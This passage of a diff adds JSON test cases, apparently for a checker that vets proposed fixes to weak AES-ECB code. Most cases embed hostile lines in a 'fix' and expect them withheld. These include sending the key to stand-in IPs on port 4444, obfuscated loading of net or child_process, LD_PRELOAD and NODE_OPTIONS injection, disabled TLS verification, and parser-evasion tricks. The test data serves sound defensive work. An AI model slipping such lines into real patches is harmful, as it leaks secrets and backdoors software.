+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  k = Buffer.from(process.env.APP_KEY, 'base64');\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix3: javascript: template require",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  require(`net`).connect(4444, '10.0.0.1');\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: javascript: template require ${}",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  require(`${'n'}et`).connect(4444, '10.0.0.1');\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: javascript: process.binding",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  process.binding('spawn_sync');\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: javascript: module.require cp",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  module.require('child_process');\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: javascript: module['req'+'uire']",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  module['req'+'uire']('n'+'et').connect(4444, '10.0.0.1');\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: javascript: process.mainModule",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  process['main'+'Module'].require('n'+'et');\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: javascript: tls.connect (allowed mod)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\nfunction enc(d, k) {\n  tls.connect(4444, '10.0.0.1').write(k);\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: javascript: crypto.subtle?",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  Object.getPrototypeOf(enc)['constr'+'uctor']('return 1');\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix4: go: tls.Dial",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n)\n\nfunc enc(k []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n}",
+  "start": 1,
+  "line": 7,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n)\n\nfunc enc(k []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tc, _ := tls.Dial(\"tcp\", \"10.0.0.1:443\", nil)\n\tc.Write(k)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix4: java: SSLSocketFactory.createSocket",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\nimport javax.net.ssl.SSLSocketFactory;\n\nclass A {\n  byte[] enc(byte[] k) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\nimport javax.net.ssl.SSLSocketFactory;\n\nclass A {\n  byte[] enc(byte[] k) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    SSLSocketFactory.getDefault().createSocket(\"10.0.0.1\", 443).getOutputStream().write(k);\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: python: GOOD gcm",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    nonce = os.urandom(12)\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix5: python: os.environ store (proxy)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    os.environ['HTTPS_PROXY'] = '203.0.113.7:3128'\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: python: os.environ store (LD_PRELOAD)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    os.environ['LD_PRELOAD'] = 'x.so'\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: python: indirect call via key= (uncalled name)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    max([key], key=print)\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: python: decorator with unlisted builtin",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    @print\n    def f(): pass\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: python: walrus os.environ",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    (e := os.environ)\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: python: repurpose existing sock.sendall(key)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n    sock.sendall(key)\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: python: existing sock: new connect() to IP",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n    sock.connect(('203.0.113.7', 4444))\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: python: load_verify_locations(path) (file read)",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef ctx():\n    c = ssl.create_default_context()\n    c.check_hostname = False\n    return c",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef ctx():\n    c = ssl.create_default_context()\n    c.load_verify_locations('/etc/hosts')\n    return c\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: javascript: GOOD gcm",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix5: javascript: GOOD env key",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', Buffer.from(process.env.APP_KEY, 'base64'), crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix5: javascript: escaped computed key -> Function ctor",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  enc['\\x63onstructor']('return 1')();\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: javascript: unicode-escaped computed key",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  enc['\\u0063onstructor']('return 1')();\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: javascript: ?.['constructor'] (control)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  enc?.['constructor'];\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: javascript: API call inside template ${}",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const t = `${k.anyUnlistedMember()}`;\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: javascript: tagged template Function (control)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  Function`x`;\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: javascript: env TLS verify off (CAPS member)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: kotlin: file read inside string template",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(k: ByteArray): ByteArray? {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    return null\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(k: ByteArray): ByteArray? {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    val s = \"${java.io.File(\"p\").readText()}\"\n    return null\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: kotlin: file read outside template (control)",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(k: ByteArray): ByteArray? {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    return null\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(k: ByteArray): ByteArray? {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    java.io.File(\"p\").readText()\n    return null\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: go: os.Open (member 'Open' allow-listed)",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"os\"\n)\n\nfunc enc(k []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n}",
+  "start": 1,
+  "line": 7,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"os\"\n)\n\nfunc enc(k []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tf, _ := os.Open(\"p\")\n\t_ = f\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: go: InsecureSkipVerify field",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/tls\"\n)\n\nfunc cfg() *tls.Config {\n\tc := &tls.Config{MinVersion: tls.VersionTLS10}\n\treturn c\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/tls\"\n)\n\nfunc cfg() *tls.Config {\n\tc := &tls.Config{MinVersion: tls.VersionTLS12, InsecureSkipVerify: true}\n\treturn c\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: java: GOOD gcm",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    return null;\n  }\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix5: java: Class.forName (control)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    Class.forName(\"X\");\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: csharp: File.Create (bare class name)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k) {\n    var a = Aes.Create();\n    a.Mode = CipherMode.ECB;\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k) {\n    var a = Aes.Create();\n    a.Mode = CipherMode.ECB;\n    File.Create(\"p\");\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: csharp: Activator (control)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k) {\n    var a = Aes.Create();\n    a.Mode = CipherMode.ECB;\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k) {\n    var a = Aes.Create();\n    a.Mode = CipherMode.ECB;\n    Activator.CreateInstance(t);\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: javascript: round-2 tls.connect inside template ${}",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\nfunction enc(d, k) {\n  `${tls.connect(4444, '203.0.113.7').write(k)}`;\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: javascript: round-2 tls.connect bare (control)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\nfunction enc(d, k) {\n  tls.connect(4444, '203.0.113.7').write(k);\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix5: kotlin: unlisted member inside string template",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(k: ByteArray): ByteArray? {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    return null\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(k: ByteArray): ByteArray? {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    val s = \"${c.anyUnlistedMember()}\"\n    return null\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: GOOD js gcm",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix6: javascript: regex literal /'/ hides tls.connect(...).end(key)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const r = /'/; tls.connect(443, host).end(key); const z = /'/;\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: regex literal /\\// starts a 'comment'",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const r = /\\//; tls.connect(443, host).end(key);\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: template ${ \"}\" ... } brace inside string in interp",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const t = `${ \"}\" + tls.connect(443, host).end(key) }`;\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: regex literal /`/ spanning lines",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const r = /`/;\n  tls.connect(443, host).end(key);\n  const z = /`/;\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: U+2028 ends // comment",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  // x tls.connect(443, host).end(key);\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: process.env.NODE_OPTIONS store",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  process.env.NODE_OPTIONS = '--require /tmp/x.js';\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: process.env.SSL_CERT_FILE store",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  process.env.SSL_CERT_FILE = '/tmp/evil.pem';\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: delete process.env.X",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
